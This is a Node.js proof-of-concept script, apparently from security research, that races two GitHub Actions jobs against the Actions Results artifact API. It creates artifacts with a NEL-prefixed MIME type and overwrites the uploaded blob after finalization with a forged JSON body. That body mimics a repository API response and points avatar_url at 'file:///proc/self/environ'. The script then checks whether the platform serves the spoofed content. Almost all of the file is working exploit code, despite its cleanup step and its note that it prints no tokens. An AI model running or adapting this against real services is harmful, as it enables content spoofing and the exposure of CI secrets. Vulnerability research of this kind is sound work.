'use strict';

// Bounded cross-job Actions Results race for Repo Cassette.  Two jobs in the
// same workflow run use one artifact name per case.  The v6 job supplies the
// NEL-prefixed MIME accepted by old artifact versions; the v7 job supplies the
// raw-delivery version with a valid MIME.  The probe prints no bearer token or
// signed storage URL and a dependent cleanup job removes every test artifact.

const crypto = require('node:crypto');
const https = require('node:https');

const SERVICE = 'github.actions.results.api.v1.ArtifactService';
const ODD = '\x85application/json';
const ODD_HEX = Buffer.from(ODD, 'latin1').toString('hex');
const BYTES = 512;
const OFFSETS = [-25, -10, -5, -2, -1, 0, 1, 2, 5, 10, 25, -3, 0, 3, 0, 0];

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

function request(url, {method = 'GET', headers = {}, body = null} = {}) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, {method, headers}, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(Buffer.from(chunk)));
      response.on('end', () => resolve({
        status: response.statusCode || 0,
        headers: response.headers,
        rawHeaders: response.rawHeaders || [],
        body: Buffer.concat(chunks),
      }));
    });
    req.setTimeout(20000, () => req.destroy(new Error('HTTP timeout')));
    req.on('error', reject);
    req.end(body);
  });
}

function backendIds(token) {
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
  const scope = String(claims.scp || '').split(' ').find(x => x.startsWith('Actions.Results:'));
  const fields = scope?.split(':') || [];
  if (fields.length !== 3) throw new Error('Actions.Results scope unavailable');
  return {run: fields[1], job: fields[2]};
}

async function twirp(method, token, value) {
  const origin = new URL(process.env.ACTIONS_RESULTS_URL).origin;
  const body = Buffer.from(JSON.stringify(value));
  const response = await request(`${origin}/twirp/${SERVICE}/${method}`, {
    method: 'POST',
    headers: {
      authorization: `Bearer ${token}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
    body,
  });
  let parsed = {};
  try { parsed = JSON.parse(response.body.toString()); } catch {}
  return {response, parsed};
}

async function api(path, {method = 'GET'} = {}) {
  return request(`https://api.github.com${path}`, {
    method,
    headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
      'user-agent': 'repo-cassette-cross-job-probe',
      'x-github-api-version': '2022-11-28',
      ...(method === 'DELETE' ? {'content-length': '0'} : {}),
    },
  });
}

async function put(url, body) {
  return request(url, {
    method: 'PUT',
    headers: {
      'content-type': 'application/octet-stream',
      'content-length': String(body.length),
      'x-ms-blob-type': 'BlockBlob',
      'x-ms-blob-content-type': ODD,
    },
    body,
  });
}

function payload(repository, artifactId, role) {
  const path = `${repository}/actions/artifacts/${artifactId}/zip`;
  const document = {
    full_name: path,
    owner: {login: role, avatar_url: 'file:///proc/self/environ'},
    description: 'cross-job v6/v7 transport probe',
    stargazers_count: 0,
    padding: '',
  };
  const base = Buffer.from(JSON.stringify(document));
  document.padding = 'A'.repeat(BYTES - base.length);
  const result = Buffer.from(JSON.stringify(document));
  if (result.length !== BYTES) throw new Error('payload padding failed');
  return result;
}

function contentTypes(response) {
  const raw = [];
  for (let i = 0; i + 1 < response.rawHeaders.length; i += 2) {
    if (String(response.rawHeaders[i]).toLowerCase() === 'content-type') {
      raw.push(Buffer.from(String(response.rawHeaders[i + 1]), 'latin1').toString('hex'));
    }
  }
  const collapsed = response.headers['content-type'];
  const values = Array.isArray(collapsed) ? collapsed : collapsed === undefined ? [] : [collapsed];
  return {
    raw,
    collapsed: values.map(x => Buffer.from(String(x), 'latin1').toString('hex')),
  };
}

async function readArtifact(repository, artifactId) {
  let first = await api(`/repos/${repository}/actions/artifacts/${artifactId}/zip`);
  let final = first;
  if (first.status >= 300 && first.status < 400 && first.headers.location) {
    final = await request(first.headers.location, {
      headers: {'user-agent': 'repo-cassette-cross-job-probe'},
    });
  }
  let document = null;
  try { document = JSON.parse(final.body.toString('utf8')); } catch {}
  const expectedPath = `${repository}/actions/artifacts/${artifactId}/zip`;
  const types = contentTypes(final);
  return {
    artifactId: String(artifactId),
    firstStatus: first.status,
    finalStatus: final.status,
    contentTypes: types,
    bytes: final.body.length,
    bodySha256: crypto.createHash('sha256').update(final.body).digest('hex'),
    bodyRouteMatch: document?.full_name === expectedPath,
    bodyRole: typeof document?.owner?.login === 'string' ? document.owner.login : '',
    winner: final.status === 200 && types.raw.includes(ODD_HEX) && document?.full_name === expectedPath,
  };
}

async function runInfo(repository) {
  const run = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}`);
  if (run.status !== 200) throw new Error(`run lookup HTTP ${run.status}`);
  const value = JSON.parse(run.body.toString());
  return {created: Date.parse(value.created_at)};
}

async function waitForPeer(repository) {
  for (let attempt = 0; attempt < 40; attempt += 1) {
    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/jobs?per_page=100`);
    if (response.status === 200) {
      const jobs = JSON.parse(response.body.toString()).jobs || [];
      const active = new Set(jobs.filter(x => x.status === 'in_progress').map(x => x.name));
      if (active.has('race-v6') && active.has('race-v7')) return;
    }
    await sleep(1000);
  }
  throw new Error('peer job did not become active');
}

async function listCaseIds(repository, name) {
  for (let attempt = 0; attempt < 4; attempt += 1) {
    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/artifacts?per_page=100&name=${encodeURIComponent(name)}`);
    if (response.status === 200) {
      const artifacts = JSON.parse(response.body.toString()).artifacts || [];
      const ids = artifacts.filter(x => x.name === name).map(x => String(x.id));
      if (ids.length) return [...new Set(ids)];
    }
    await sleep(400);
  }
  return [];
}

async function waitUntil(epoch) {
  const delay = epoch - Date.now();
  if (delay > 0) await sleep(delay);
}

function errorText(result) {
  if (result.response.status < 400) return '';
  return result.response.body.toString('utf8').slice(0, 180);
}

async function race() {
  const role = process.env.ROLE;
  if (!['v6', 'v7'].includes(role)) throw new Error('ROLE must be v6 or v7');
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const repository = process.env.GITHUB_REPOSITORY;
  if (!token || !repository || !process.env.GITHUB_TOKEN) throw new Error('Actions environment incomplete');
  const ids = backendIds(token);
  await waitForPeer(repository);
  const info = await runInfo(repository);
  if (!Number.isFinite(info.created)) throw new Error('run created_at unavailable');

  // Both jobs derive this from the immutable run timestamp.  Three minutes is
  // enough for ordinary hosted-runner startup and keeps every case aligned.
  let start = info.created + 180000;
  while (start < Date.now() + 15000) start += 60000;
  const roleOffset = role === 'v7' ? 1 : 0;
  console.log(`CROSS_JOB_START ${JSON.stringify({role, start, cases: OFFSETS.length})}`);

  for (let index = 0; index < OFFSETS.length; index += 1) {
    const name = `cross-job-${process.env.GITHUB_RUN_ID}-${index}`;
    const target = start + index * 2500;
    const offset = role === 'v7' ? OFFSETS[index] : 0;
    await waitUntil(target + offset);
    const createdAt = Date.now();
    const create = await twirp('CreateArtifact', token, {
      workflow_run_backend_id: ids.run,
      workflow_job_run_backend_id: ids.job,
      name,
      version: role === 'v6' ? 6 : 7,
      mime_type: role === 'v6' ? ODD : 'application/json',
    });
    const url = create.parsed.signed_upload_url || create.parsed.signedUploadUrl || '';
    const row = {
      index,
      role,
      requestedOffsetMs: offset,
      createStartedDeltaMs: createdAt - target,
      createStatus: create.response.status,
      createOk: Boolean(create.parsed.ok),
      createError: errorText(create),
      uploadStatus: 0,
      finalizeStatus: 0,
      artifactId: '',
      visibleIds: [],
      downloads: [],
    };

    if (create.response.status >= 200 && create.response.status < 300 && create.parsed.ok && url) {
      const upload = await put(url, Buffer.alloc(BYTES, 0x20));
      row.uploadStatus = upload.status;
      await waitUntil(target + 1000);
      const finalized = await twirp('FinalizeArtifact', token, {
        workflow_run_backend_id: ids.run,
        workflow_job_run_backend_id: ids.job,
        name,
        size: String(BYTES),
      });
      row.finalizeStatus = finalized.response.status;
      row.artifactId = String(finalized.parsed.artifact_id || finalized.parsed.artifactId || '');
      if (/^\d+$/.test(row.artifactId)) {
        const rewritten = await put(url, payload(repository, row.artifactId, role));
        row.rewriteStatus = rewritten.status;
      }
    }

    await waitUntil(target + 1600);
    row.visibleIds = await listCaseIds(repository, name);
    for (const artifactId of row.visibleIds) {
      try { row.downloads.push(await readArtifact(repository, artifactId)); }
      catch (error) { row.downloads.push({artifactId, error: String(error.message || error)}); }
    }
    console.log(`CROSS_JOB_RESULT ${JSON.stringify(row)}`);
    const winner = row.downloads.find(x => x.winner);
    if (winner) console.log(`CROSS_JOB_WINNER ${JSON.stringify({index, role, artifactId: winner.artifactId})}`);
  }
}

async function cleanup() {
  const repository = process.env.GITHUB_REPOSITORY;
  let deleted = 0;
  for (let page = 1; page <= 3; page += 1) {
    const response = await api(`/repos/${repository}/actions/runs/${process.env.GITHUB_RUN_ID}/artifacts?per_page=100&page=${page}`);
    if (response.status !== 200) throw new Error(`cleanup listing HTTP ${response.status}`);
    const artifacts = JSON.parse(response.body.toString()).artifacts || [];
    for (const artifact of artifacts) {
      if (!String(artifact.name).startsWith(`cross-job-${process.env.GITHUB_RUN_ID}-`)) continue;
      const removed = await api(`/repos/${repository}/actions/artifacts/${artifact.id}`, {method: 'DELETE'});
      if (![204, 404].includes(removed.status)) throw new Error(`cleanup delete HTTP ${removed.status}`);
      deleted += 1;
    }
    if (artifacts.length < 100) break;
  }
  console.log(`CROSS_JOB_CLEANUP ${JSON.stringify({deleted})}`);
}

async function main() {
  if (process.env.ROLE === 'cleanup') return cleanup();
  return race();
}

main().catch(error => {
  console.error(error.stack || error);
  process.exitCode = 1;
});

